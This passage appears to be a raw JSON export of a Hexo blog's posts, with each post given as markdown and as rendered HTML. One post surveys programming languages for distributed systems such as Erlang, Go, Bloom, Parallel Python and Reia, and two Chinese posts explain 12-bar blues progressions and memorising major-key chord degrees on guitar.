I think it suffers from some sad and limited thinking on the part of its authors. I think its decisions on fault and exception handling are retrograde, and render the language unusable.\n\nBut I now think in terms of large team development where having N-factorial implementation options leads to N-factorial different coding tarpits. At least Go doesn't seem to have labrea scale tarpits, only certain conventional mudwallows. They absolutely love tabs and will insert them into your code for you if you fail to love them enough.\n\n## 3. Bloom\n[Bloom][6] is a new domain-specific language for distributed programming. The current alpha release is embedded in Ruby, and targeted at early adopters. Bloom leverages new research on \"CALM\" analysis to provide tools that pinpoint distributed consistency and coordination issues in your code.\n\n## 4. Python\n[Parallel Python][7] is a python module which provides mechanism for parallel execution of python code on SMP (systems with multiple processors or cores) and clusters (computers connected via network):\n\n**Features:** \n\n * Parallel execution of python code on SMP and clusters \n * Easy to understand and implement job-based parallelization technique (easy to convert serial application in parallel)\n * Automatic detection of the optimal configuration (by default the number of worker processes is set to the number of effective processors)\n * Dynamic processors allocation (number of worker processes can be changed at runtime)\n * Low overhead for subsequent jobs with the same function (transparent caching is implemented to decrease the overhead)\n * Dynamic load balancing (jobs are distributed between processors at runtime)\n * Fault-tolerance (if one of the nodes fails tasks are rescheduled on others)\n * Auto-discovery of computational resources\n * Dynamic allocation of computational resources (consequence of auto-discovery and fault-tolerance) \n * SHA based authentication for network connections\n * Cross-platform portability and interoperability (Windows, Linux, Unix, Mac OS X)\n * Cross-architecture portability and interoperability (x86, x86-64, etc.)\n * Open source\n\nOne can get a quick idea of how the code might look by [looking at the quick-start guide for clusters][8].\n\n## 5. Reia\n[Reia][9] is a scripting language for distributed system:\n\n> Reia aims to expose the powerful\n> capabilities of Erlang in a way which\n> is easier for your average programmer\n> to understand. It aims to bring the\n> beauty and simplicity of Ruby, a\n> language which is easy and fun to\n> program in, to Erlang, a language\n> which very few will think of as easy\n> or fun to use.\n\n\n\n  [1]: http://www.erlang.org/\n  [2]: http://en.wikipedia.org/wiki/Erlang_%28programming_language%29\n  [3]: http://www.erlang.org/doc/reference_manual/distributed.html\n  [4]: http://en.wikipedia.org/wiki/Functional_programming\n  [5]: http://blog.golang.org/2011/04/go-at-heroku.html\n  [6]: http://bloom-lang.net/\n  [7]: http://www.parallelpython.com/\n  [8]: http://www.parallelpython.com/content/view/15/30/#QUICKCLUSTERS\n  [9]: http://reia-lang.org/","source":"_posts/programming-language-for-distributed-system.md","raw":"---\nlayout: title\ntitle: Programming language for Distribute System\ndate: 2018-02-09 21:19:15\ntags: distributed System\ncategories: Tech\n---\n## 1. Erlang\n[Erlang][1], as described by [Wikipedia][2]:\n\n> It was designed by Ericsson to support distributed, fault-tolerant, soft-real-time, non-stop applications.\n\nYou might also want to read the [*Distributed Erlang*][3] section of their manual.\n\nHowever, note that Erlang is a [*functional* language][4] and will require a much different paradigm of thought as compared to C++.\n\n> A distributed Erlang system consists of a number of Erlang runtime systems communicating with each other. Each such runtime system is called a node. Message passing between processes at different nodes, as well as links and monitors, are transparent when pids are used. Registered names, however, are local to each node. This means that the node must be specified as well when sending messages, and so on, using registered names.\n\n\n\n\n\n\n## 2. Golang\nGoLang from Google is a pretty new language. It seems that among its many attributes, it may some day be suitable for large distributed systems requiring a lot of message queues to achieve scalable consistent and reliable behaviours, at least according to [these folks][5] at heroku.\n\nGo seems to be focused on concurrency issues, threading primitives in the language, and so on, and this is perhaps a necessary-but-not-quite-sufficient starting point for distributed systems. Perhaps their thoughts will be helpful to you. I wouldn't call Go-lang's support for distributed systems \"first-class\", but rather, say that it would be possible to build a first class distributed-systems framework using Go's library and language primitives.\n\nAt first, I'm less impressed with Go. I think it suffers from some sad and limited thinking on the part of its authors. I think its decisions on fault and exception handling are retrograde, and render the language unusable.\n\nBut I now think in terms of large team development where having N-factorial implementation options leads to N-factorial different coding tarpits. At least Go doesn't seem to have labrea scale tarpits, only certain conventional mudwallows. They absolutely love tabs and will insert them into your code for you if you fail to love them enough.\n\n## 3. Bloom\n[Bloom][6] is a new domain-specific language for distributed programming. The current alpha release is embedded in Ruby, and targeted at early adopters. Bloom leverages new research on \"CALM\" analysis to provide tools that pinpoint distributed consistency and coordination issues in your code.\n\n## 4. Python\n[Parallel Python][7] is a python module which provides mechanism for parallel execution of python code on SMP (systems with multiple processors or cores) and clusters (computers connected via network):\n\n**Features:** \n\n * Parallel execution of python code on SMP and clusters \n * Easy to understand and implement job-based parallelization technique (easy to convert serial application in parallel)\n * Automatic detection of the optimal configuration (by default the number of worker processes is set to the number of effective processors)\n * Dynamic processors allocation (number of worker processes can be changed at runtime)\n * Low overhead for subsequent jobs with the same function (transparent caching is implemented to decrease the overhead)\n * Dynamic load balancing (jobs are distributed between processors at runtime)\n * Fault-tolerance (if one of the nodes fails tasks are rescheduled on others)\n * Auto-discovery of computational resources\n * Dynamic allocation of computational resources (consequence of auto-discovery and fault-tolerance) \n * SHA based authentication for network connections\n * Cross-platform portability and interoperability (Windows, Linux, Unix, Mac OS X)\n * Cross-architecture portability and interoperability (x86, x86-64, etc.)\n * Open source\n\nOne can get a quick idea of how the code might look by [looking at the quick-start guide for clusters][8].\n\n## 5. Reia\n[Reia][9] is a scripting language for distributed system:\n\n> Reia aims to expose the powerful\n> capabilities of Erlang in a way which\n> is easier for your average programmer\n> to understand. It aims to bring the\n> beauty and simplicity of Ruby, a\n> language which is easy and fun to\n> program in, to Erlang, a language\n> which very few will think of as easy\n> or fun to use.\n\n\n\n  [1]: http://www.erlang.org/\n  [2]: http://en.wikipedia.org/wiki/Erlang_%28programming_language%29\n  [3]: http://www.erlang.org/doc/reference_manual/distributed.html\n  [4]: http://en.wikipedia.org/wiki/Functional_programming\n  [5]: http://blog.golang.org/2011/04/go-at-heroku.html\n  [6]: http://bloom-lang.net/\n  [7]: http://www.parallelpython.com/\n  [8]: http://www.parallelpython.com/content/view/15/30/#QUICKCLUSTERS\n  [9]: http://reia-lang.org/","slug":"programming-language-for-distributed-system","published":1,"updated":"2019-02-13T13:58:24.931Z","comments":1,"photos":[],"link":"","_id":"ckkljsasr0022r242h7atj8rq","content":"<h2 id=\"1-Erlang\"><a href=\"#1-Erlang\" class=\"headerlink\" title=\"1. Erlang\"></a>1. Erlang</h2><p><a href=\"http://www.erlang.org/\" target=\"_blank\" rel=\"external\">Erlang</a>, as described by <a href=\"http://en.wikipedia.org/wiki/Erlang_%28programming_language%29\" target=\"_blank\" rel=\"external\">Wikipedia</a>:</p>\n<blockquote>\n<p>It was designed by Ericsson to support distributed, fault-tolerant, soft-real-time, non-stop applications.</p>\n</blockquote>\n<p>You might also want to read the <a href=\"http://www.erlang.org/doc/reference_manual/distributed.html\" target=\"_blank\" rel=\"external\"><em>Distributed Erlang</em></a> section of their manual.</p>\n<p>However, note that Erlang is a <a href=\"http://en.wikipedia.org/wiki/Functional_programming\" target=\"_blank\" rel=\"external\"><em>functional</em> language</a> and will require a much different paradigm of thought as compared to C++.</p>\n<blockquote>\n<p>A distributed Erlang system consists of a number of Erlang runtime systems communicating with each other. Each such runtime system is called a node. Message passing between processes at different nodes, as well as links and monitors, are transparent when pids are used. Registered names, however, are local to each node. This means that the node must be specified as well when sending messages, and so on, using registered names.</p>\n</blockquote>\n<h2 id=\"2-Golang\"><a href=\"#2-Golang\" class=\"headerlink\" title=\"2. Golang\"></a>2. Golang</h2><p>GoLang from Google is a pretty new language. It seems that among its many attributes, it may some day be suitable for large distributed systems requiring a lot of message queues to achieve scalable consistent and reliable behaviours, at least according to <a href=\"http://blog.golang.org/2011/04/go-at-heroku.html\" target=\"_blank\" rel=\"external\">these folks</a> at heroku.</p>\n<p>Go seems to be focused on concurrency issues, threading primitives in the language, and so on, and this is perhaps a necessary-but-not-quite-sufficient starting point for distributed systems. Perhaps their thoughts will be helpful to you. I wouldn’t call Go-lang’s support for distributed systems “first-class”, but rather, say that it would be possible to build a first class distributed-systems framework using Go’s library and language primitives.</p>\n<p>At first, I’m less impressed with Go. I think it suffers from some sad and limited thinking on the part of its authors. I think its decisions on fault and exception handling are retrograde, and render the language unusable.</p>\n<p>But I now think in terms of large team development where having N-factorial implementation options leads to N-factorial different coding tarpits. At least Go doesn’t seem to have labrea scale tarpits, only certain conventional mudwallows. They absolutely love tabs and will insert them into your code for you if you fail to love them enough.</p>\n<h2 id=\"3-Bloom\"><a href=\"#3-Bloom\" class=\"headerlink\" title=\"3. Bloom\"></a>3. Bloom</h2><p><a href=\"http://bloom-lang.net/\" target=\"_blank\" rel=\"external\">Bloom</a> is a new domain-specific language for distributed programming. The current alpha release is embedded in Ruby, and targeted at early adopters. Bloom leverages new research on “CALM” analysis to provide tools that pinpoint distributed consistency and coordination issues in your code.</p>\n<h2 id=\"4-Python\"><a href=\"#4-Python\" class=\"headerlink\" title=\"4. Python\"></a>4. Python</h2><p><a href=\"http://www.parallelpython.com/\" target=\"_blank\" rel=\"external\">Parallel Python</a> is a python module which provides mechanism for parallel execution of python code on SMP (systems with multiple processors or cores) and clusters (computers connected via network):</p>\n<p><strong>Features:</strong> </p>\n<ul>\n<li>Parallel execution of python code on SMP and clusters </li>\n<li>Easy to understand and implement job-based parallelization technique (easy to convert serial application in parallel)</li>\n<li>Automatic detection of the optimal configuration (by default the number of worker processes is set to the number of effective processors)</li>\n<li>Dynamic processors allocation (number of worker processes can be changed at runtime)</li>\n<li>Low overhead for subsequent jobs with the same function (transparent caching is implemented to decrease the overhead)</li>\n<li>Dynamic load balancing (jobs are distributed between processors at runtime)</li>\n<li>Fault-tolerance (if one of the nodes fails tasks are rescheduled on others)</li>\n<li>Auto-discovery of computational resources</li>\n<li>Dynamic allocation of computational resources (consequence of auto-discovery and fault-tolerance) </li>\n<li>SHA based authentication for network connections</li>\n<li>Cross-platform portability and interoperability (Windows, Linux, Unix, Mac OS X)</li>\n<li>Cross-architecture portability and interoperability (x86, x86-64, etc.)</li>\n<li>Open source</li>\n</ul>\n<p>One can get a quick idea of how the code might look by <a href=\"http://www.parallelpython.com/content/view/15/30/#QUICKCLUSTERS\" target=\"_blank\" rel=\"external\">looking at the quick-start guide for clusters</a>.</p>\n<h2 id=\"5-Reia\"><a href=\"#5-Reia\" class=\"headerlink\" title=\"5. Reia\"></a>5. Reia</h2><p><a href=\"http://reia-lang.org/\" target=\"_blank\" rel=\"external\">Reia</a> is a scripting language for distributed system:</p>\n<blockquote>\n<p>Reia aims to expose the powerful<br>capabilities of Erlang in a way which<br>is easier for your average programmer<br>to understand. It aims to bring the<br>beauty and simplicity of Ruby, a<br>language which is easy and fun to<br>program in, to Erlang, a language<br>which very few will think of as easy<br>or fun to use.</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-Erlang\"><a href=\"#1-Erlang\" class=\"headerlink\" title=\"1. Erlang\"></a>1. Erlang</h2><p><a href=\"http://www.erlang.org/\">Erlang</a>, as described by <a href=\"http://en.wikipedia.org/wiki/Erlang_%28programming_language%29\">Wikipedia</a>:</p>\n<blockquote>\n<p>It was designed by Ericsson to support distributed, fault-tolerant, soft-real-time, non-stop applications.</p>\n</blockquote>\n<p>You might also want to read the <a href=\"http://www.erlang.org/doc/reference_manual/distributed.html\"><em>Distributed Erlang</em></a> section of their manual.</p>\n<p>However, note that Erlang is a <a href=\"http://en.wikipedia.org/wiki/Functional_programming\"><em>functional</em> language</a> and will require a much different paradigm of thought as compared to C++.</p>\n<blockquote>\n<p>A distributed Erlang system consists of a number of Erlang runtime systems communicating with each other. Each such runtime system is called a node. Message passing between processes at different nodes, as well as links and monitors, are transparent when pids are used. Registered names, however, are local to each node. This means that the node must be specified as well when sending messages, and so on, using registered names.</p>\n</blockquote>\n<h2 id=\"2-Golang\"><a href=\"#2-Golang\" class=\"headerlink\" title=\"2. Golang\"></a>2. Golang</h2><p>GoLang from Google is a pretty new language. It seems that among its many attributes, it may some day be suitable for large distributed systems requiring a lot of message queues to achieve scalable consistent and reliable behaviours, at least according to <a href=\"http://blog.golang.org/2011/04/go-at-heroku.html\">these folks</a> at heroku.</p>\n<p>Go seems to be focused on concurrency issues, threading primitives in the language, and so on, and this is perhaps a necessary-but-not-quite-sufficient starting point for distributed systems. Perhaps their thoughts will be helpful to you. I wouldn’t call Go-lang’s support for distributed systems “first-class”, but rather, say that it would be possible to build a first class distributed-systems framework using Go’s library and language primitives.</p>\n<p>At first, I’m less impressed with Go. I think it suffers from some sad and limited thinking on the part of its authors. I think its decisions on fault and exception handling are retrograde, and render the language unusable.</p>\n<p>But I now think in terms of large team development where having N-factorial implementation options leads to N-factorial different coding tarpits. At least Go doesn’t seem to have labrea scale tarpits, only certain conventional mudwallows. They absolutely love tabs and will insert them into your code for you if you fail to love them enough.</p>\n<h2 id=\"3-Bloom\"><a href=\"#3-Bloom\" class=\"headerlink\" title=\"3. Bloom\"></a>3. Bloom</h2><p><a href=\"http://bloom-lang.net/\">Bloom</a> is a new domain-specific language for distributed programming. The current alpha release is embedded in Ruby, and targeted at early adopters. Bloom leverages new research on “CALM” analysis to provide tools that pinpoint distributed consistency and coordination issues in your code.</p>\n<h2 id=\"4-Python\"><a href=\"#4-Python\" class=\"headerlink\" title=\"4. Python\"></a>4. Python</h2><p><a href=\"http://www.parallelpython.com/\">Parallel Python</a> is a python module which provides mechanism for parallel execution of python code on SMP (systems with multiple processors or cores) and clusters (computers connected via network):</p>\n<p><strong>Features:</strong> </p>\n<ul>\n<li>Parallel execution of python code on SMP and clusters </li>\n<li>Easy to understand and implement job-based parallelization technique (easy to convert serial application in parallel)</li>\n<li>Automatic detection of the optimal configuration (by default the number of worker processes is set to the number of effective processors)</li>\n<li>Dynamic processors allocation (number of worker processes can be changed at runtime)</li>\n<li>Low overhead for subsequent jobs with the same function (transparent caching is implemented to decrease the overhead)</li>\n<li>Dynamic load balancing (jobs are distributed between processors at runtime)</li>\n<li>Fault-tolerance (if one of the nodes fails tasks are rescheduled on others)</li>\n<li>Auto-discovery of computational resources</li>\n<li>Dynamic allocation of computational resources (consequence of auto-discovery and fault-tolerance) </li>\n<li>SHA based authentication for network connections</li>\n<li>Cross-platform portability and interoperability (Windows, Linux, Unix, Mac OS X)</li>\n<li>Cross-architecture portability and interoperability (x86, x86-64, etc.)</li>\n<li>Open source</li>\n</ul>\n<p>One can get a quick idea of how the code might look by <a href=\"http://www.parallelpython.com/content/view/15/30/#QUICKCLUSTERS\">looking at the quick-start guide for clusters</a>.</p>\n<h2 id=\"5-Reia\"><a href=\"#5-Reia\" class=\"headerlink\" title=\"5. Reia\"></a>5. Reia</h2><p><a href=\"http://reia-lang.org/\">Reia</a> is a scripting language for distributed system:</p>\n<blockquote>\n<p>Reia aims to expose the powerful<br>capabilities of Erlang in a way which<br>is easier for your average programmer<br>to understand. It aims to bring the<br>beauty and simplicity of Ruby, a<br>language which is easy and fun to<br>program in, to Erlang, a language<br>which very few will think of as easy<br>or fun to use.</p>\n</blockquote>\n"},{"layout":"title","title":"和弦级数和blues入门-2","date":"2019-03-23T13:49:27.000Z","_content":"\n## Blues Rhythms\n\n我们需要了解和弦进行，当和弦改变的时候，怎样分配时间到每个和弦，什么方法。\n\nBlues节奏型有许多。最常见的是I-IV-V 12-bar。传统的12-bar blues一共有12和小节同时重复这12小节一遍又一遍。当然节奏会改变。举几个简单的例子, 最基础的12-bar blues:\n\n```\nI - I - I - I \nIV - IV - I - I \nV - IV - I -I\n```\n\n如果key是在C的话那就是\n```\nC - C - C - C\nF - F - C - C\nG - F - C - C\n```\n\n当然还有各种变种的blues最常见的就是IV和弦在第二行的时候加入一个V和弦变调，为了转换更加和谐。这是当你重复这一段riff的时候。所以就变成了:\n\n```\nI - IV - I - I\nIV - IV - I - I\nV - IV - I - V\n```\n\n如果是C调的话\n\n```\nC - F - C - C\nF - F - C - C \nG - F - C - G\n```\n\n另外的一个variation就是将II级minor和弦加在第九小节和第十小节，所以如果是C调的话：\n\n```\nC - F - C - C\nF - F - C - C\nDm - G - C - G\n```\n\n","source":"_posts/和弦级数和blues入门-2.md","raw":"---\nlayout: title\ntitle: 和弦级数和blues入门-2\ndate: 2019-03-23 08:49:27\ntags: jazz\ncategories: Music\n---\n\n## Blues Rhythms\n\n我们需要了解和弦进行，当和弦改变的时候，怎样分配时间到每个和弦，什么方法。\n\nBlues节奏型有许多。最常见的是I-IV-V 12-bar。传统的12-bar blues一共有12和小节同时重复这12小节一遍又一遍。当然节奏会改变。举几个简单的例子, 最基础的12-bar blues:\n\n```\nI - I - I - I \nIV - IV - I - I \nV - IV - I -I\n```\n\n如果key是在C的话那就是\n```\nC - C - C - C\nF - F - C - C\nG - F - C - C\n```\n\n当然还有各种变种的blues最常见的就是IV和弦在第二行的时候加入一个V和弦变调，为了转换更加和谐。这是当你重复这一段riff的时候。所以就变成了:\n\n```\nI - IV - I - I\nIV - IV - I - I\nV - IV - I - V\n```\n\n如果是C调的话\n\n```\nC - F - C - C\nF - F - C - C \nG - F - C - G\n```\n\n另外的一个variation就是将II级minor和弦加在第九小节和第十小节，所以如果是C调的话：\n\n```\nC - F - C - C\nF - F - C - C\nDm - G - C - G\n```\n\n","slug":"和弦级数和blues入门-2","published":1,"updated":"2019-08-06T14:19:04.900Z","comments":1,"photos":[],"link":"","_id":"ckkljsatz002vr24229zm5g0v","content":"<h2 id=\"Blues-Rhythms\"><a href=\"#Blues-Rhythms\" class=\"headerlink\" title=\"Blues Rhythms\"></a>Blues Rhythms</h2><p>我们需要了解和弦进行，当和弦改变的时候，怎样分配时间到每个和弦，什么方法。</p>\n<p>Blues节奏型有许多。最常见的是I-IV-V 12-bar。传统的12-bar blues一共有12和小节同时重复这12小节一遍又一遍。当然节奏会改变。举几个简单的例子, 最基础的12-bar blues:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I - I - I - I </span><br><span class=\"line\">IV - IV - I - I </span><br><span class=\"line\">V - IV - I -I</span><br></pre></td></tr></table></figure>\n<p>如果key是在C的话那就是<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C - C - C - C</span><br><span class=\"line\">F - F - C - C</span><br><span class=\"line\">G - F - C - C</span><br></pre></td></tr></table></figure></p>\n<p>当然还有各种变种的blues最常见的就是IV和弦在第二行的时候加入一个V和弦变调，为了转换更加和谐。这是当你重复这一段riff的时候。所以就变成了:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I - IV - I - I</span><br><span class=\"line\">IV - IV - I - I</span><br><span class=\"line\">V - IV - I - V</span><br></pre></td></tr></table></figure>\n<p>如果是C调的话</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C - F - C - C</span><br><span class=\"line\">F - F - C - C </span><br><span class=\"line\">G - F - C - G</span><br></pre></td></tr></table></figure>\n<p>另外的一个variation就是将II级minor和弦加在第九小节和第十小节，所以如果是C调的话：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C - F - C - C</span><br><span class=\"line\">F - F - C - C</span><br><span class=\"line\">Dm - G - C - G</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Blues-Rhythms\"><a href=\"#Blues-Rhythms\" class=\"headerlink\" title=\"Blues Rhythms\"></a>Blues Rhythms</h2><p>我们需要了解和弦进行，当和弦改变的时候，怎样分配时间到每个和弦，什么方法。</p>\n<p>Blues节奏型有许多。最常见的是I-IV-V 12-bar。传统的12-bar blues一共有12和小节同时重复这12小节一遍又一遍。当然节奏会改变。举几个简单的例子, 最基础的12-bar blues:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I - I - I - I </span><br><span class=\"line\">IV - IV - I - I </span><br><span class=\"line\">V - IV - I -I</span><br></pre></td></tr></table></figure>\n<p>如果key是在C的话那就是<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C - C - C - C</span><br><span class=\"line\">F - F - C - C</span><br><span class=\"line\">G - F - C - C</span><br></pre></td></tr></table></figure></p>\n<p>当然还有各种变种的blues最常见的就是IV和弦在第二行的时候加入一个V和弦变调，为了转换更加和谐。这是当你重复这一段riff的时候。所以就变成了:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I - IV - I - I</span><br><span class=\"line\">IV - IV - I - I</span><br><span class=\"line\">V - IV - I - V</span><br></pre></td></tr></table></figure>\n<p>如果是C调的话</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C - F - C - C</span><br><span class=\"line\">F - F - C - C </span><br><span class=\"line\">G - F - C - G</span><br></pre></td></tr></table></figure>\n<p>另外的一个variation就是将II级minor和弦加在第九小节和第十小节，所以如果是C调的话：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C - F - C - C</span><br><span class=\"line\">F - F - C - C</span><br><span class=\"line\">Dm - G - C - G</span><br></pre></td></tr></table></figure>\n"},{"layout":"title","title":"和弦级数的记忆","date":"2019-04-01T13:49:27.000Z","_content":"\n在记忆的时候遇到了一些问题，这里转载和整理一下 \n\n> https://www.zhihu.com/question/21202184/answer/683953151 \n\n大调音阶有7个音，分别以它们为根音构建3和弦，和谐的只有6个，第7个构成的和弦因为太严肃不讨人喜欢基本被一脚踢开。所以我们可以简洁地讨论前边的6个和弦。\n\n| G | Am  | Bm  | C  | D | Em  |\n|---|-----|-----|----|---|-----|\n| A | Bm  | C#m | D  | E | F#m |\n| C | Dm  | Em  | F  | G | Am  |\n| D | Em  | F#m | G  | A | Bm  |\n| E | F#m | G#m | A  | B | C#m |\n| F | Gm  | Am  | Bb | C | Dm  |\n\n看看它们，总结出级数与和弦特点之间的规律：\n\n+ 大和弦\n+ 小和弦\n+ 小\n+ 大\n+ 大\n+ 小\n\n它们可以说是音乐中最重要的规律，所有的音乐，要么直接使用它们，要么跟它们相关，145大 236小，要牢牢记住。所有大调都是这个规律。很多书上用罗马数字来表示它们。\n\n要把它们当图案来记忆，非常整洁。想想，当你用横按和弦来弹奏，是不是就只有3个位置，简洁到极致时你弹整首歌就只需要在这3个位置上移来移去。尽管每个调的音不同，但级数规律是不变的，所以思考和弦进行时，把注意力放在数字上会更有优势。特别是转调的时候。\n\n转调只需要在指板其它位置上重复同样的数字图案。由第一个和弦决定是什么调。如果你在5品开始，你的所有和弦都是A调的，不需要考虑什么全全半全全全半、升这个音、降那个音。如果在7品开始，你就在弹奏B调的和弦，以此类推。如果你从6弦空弦开始，就是E调，在这个位置，一级和四级和弦就变成空弦和弦（想想前3品的E和弦和A和弦）。\n\n两个练习：你要不断往下移去练习不同的调。然后在不同调上练习相同的和弦进行，这就是转调练习。现在你一共拥有两个数字图案，也就是说一个调你可以在指板的两个不同位置弹奏出来。你可以从你的曲子里选取一个和弦进行，然后分别在两个位置上弹奏。很多吉他爱好者都被C调和G调惯坏了，这两个调几乎所有和弦都是空弦和弦，虽然好按，指法简单，但也丧失了横按和弦进行的简洁，更要命的是丧失了这种图案思维。我们现在需要做的当然不是发誓不用空弦和弦，空弦和弦非常好，没毛病，而是用数字图案的思维来弹奏空弦和弦。即当你弹奏开放和弦时，脑中要有相应横按和弦的思维图像。举G调的例，脑中形成6弦3品开始的G横按和弦（眼睛也可以相应盯着看，就像假动作），手却按出开放的G；脑中形成6弦5品的横按，你意识到它其实是个Am，然后按出开放的Am。只要你对6弦和5弦的音够熟悉就可以轻易做到，不要忘了在其它调上也这样练习。","source":"_posts/和弦级数的记忆.md","raw":"---\nlayout: title\ntitle: 和弦级数的记忆\ndate: 2019-04-01 08:49:27\ntags: jazz\ncategories: Music\n---\n\n在记忆的时候遇到了一些问题，这里转载和整理一下 \n\n> https://www.zhihu.com/question/21202184/answer/683953151 \n\n大调音阶有7个音，分别以它们为根音构建3和弦，和谐的只有6个，第7个构成的和弦因为太严肃不讨人喜欢基本被一脚踢开。所以我们可以简洁地讨论前边的6个和弦。\n\n| G | Am  | Bm  | C  | D | Em  |\n|---|-----|-----|----|---|-----|\n| A | Bm  | C#m | D  | E | F#m |\n| C | Dm  | Em  | F  | G | Am  |\n| D | Em  | F#m | G  | A | Bm  |\n| E | F#m | G#m | A  | B | C#m |\n| F | Gm  | Am  | Bb | C | Dm  |\n\n看看它们，总结出级数与和弦特点之间的规律：\n\n+ 大和弦\n+ 小和弦\n+ 小\n+ 大\n+ 大\n+ 小\n\n它们可以说是音乐中最重要的规律，所有的音乐，要么直接使用它们，要么跟它们相关，145大 236小，要牢牢记住。所有大调都是这个规律。很多书上用罗马数字来表示它们。\n\n要把它们当图案来记忆，非常整洁。想想，当你用横按和弦来弹奏，是不是就只有3个位置，简洁到极致时你弹整首歌就只需要在这3个位置上移来移去。尽管每个调的音不同，但级数规律是不变的，所以思考和弦进行时，把注意力放在数字上会更有优势。特别是转调的时候。\n\n转调只需要在指板其它位置上重复同样的数字图案。由第一个和弦决定是什么调。如果你在5品开始，你的所有和弦都是A调的，不需要考虑什么全全半全全全半、升这个音、降那个音。如果在7品开始，你就在弹奏B调的和弦，以此类推。如果你从6弦空弦开始，就是E调，在这个位置，一级和四级和弦就变成空弦和弦（想想前3品的E和弦和A和弦）。\n\n两个练习：你要不断往下移去练习不同的调。然后在不同调上练习相同的和弦进行，这就是转调练习。现在你一共拥有两个数字图案，也就是说一个调你可以在指板的两个不同位置弹奏出来。你可以从你的曲子里选取一个和弦进行，然后分别在两个位置上弹奏。很多吉他爱好者都被C调和G调惯坏了，这两个调几乎所有和弦都是空弦和弦，虽然好按，指法简单，但也丧失了横按和弦进行的简洁，更要命的是丧失了这种图案思维。我们现在需要做的当然不是发誓不用空弦和弦，空弦和弦非常好，没毛病，而是用数字图案的思维来弹奏空弦和弦。即当你弹奏开放和弦时，脑中要有相应横按和弦的思维图像。举G调的例，脑中形成6弦3品开始的G横按和弦（眼睛也可以相应盯着看，就像假动作），手却按出开放的G；脑中形成6弦5品的横按，你意识到它其实是个Am，然后按出开放的Am。只要你对6弦和5弦的音够熟悉就可以轻易做到，不要忘了在其它调上也这样练习。","slug":"和弦级数的记忆","published":1,"updated":"2019-08-06T14:32:30.077Z","comments":1,"photos":[],"link":"","_id":"ckkljsau2002xr242hfp486pb","content":"<p>在记忆的时候遇到了一些问题，这里转载和整理一下 </p>\n<blockquote>\n<p><a href=\"https://www.zhihu.com/question/21202184/answer/683953151\" target=\"_blank\" rel=\"external\">https://www.zhihu.com/question/21202184/answer/683953151</a> </p>\n</blockquote>\n<p>大调音阶有7个音，分别以它们为根音构建3和弦，和谐的只有6个，第7个构成的和弦因为太严肃不讨人喜欢基本被一脚踢开。所以我们可以简洁地讨论前边的6个和弦。</p>\n<table>\n<thead>\n<tr>\n<th>G</th>\n<th>Am</th>\n<th>Bm</th>\n<th>C</th>\n<th>D</th>\n<th>Em</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>A</td>\n<td>Bm</td>\n<td>C#m</td>\n<td>D</td>\n<td>E</td>\n<td>F#m</td>\n</tr>\n<tr>\n<td>C</td>\n<td>Dm</td>\n<td>Em</td>\n<td>F</td>\n<td>G</td>\n<td>Am</td>\n</tr>\n<tr>\n<td>D</td>\n<td>Em</td>\n<td>F#m</td>\n<td>G</td>\n<td>A</td>\n<td>Bm</td>\n</tr>\n<tr>\n<td>E</td>\n<td>F#m</td>\n<td>G#m</td>\n<td>A</td>\n<td>B</td>\n<td>C#m</td>\n</tr>\n<tr>\n<td>F</td>\n<td>Gm</td>\n<td>Am</td>\n<td>Bb</td>\n<td>C</td>\n<td>Dm</td>\n</tr>\n</tbody>\n</table>\n<p>看看它们，总结出级数与和弦特点之间的规律：</p>\n<ul>\n<li>大和弦</li>\n<li>小和弦</li>\n<li>小</li>\n<li>大</li>\n<li>大</li>\n<li>小</li>\n</ul>\n<p>它们可以说是音乐中最重要的规律，所有的音乐，要么直接使用它们，要么跟它们相关，145大 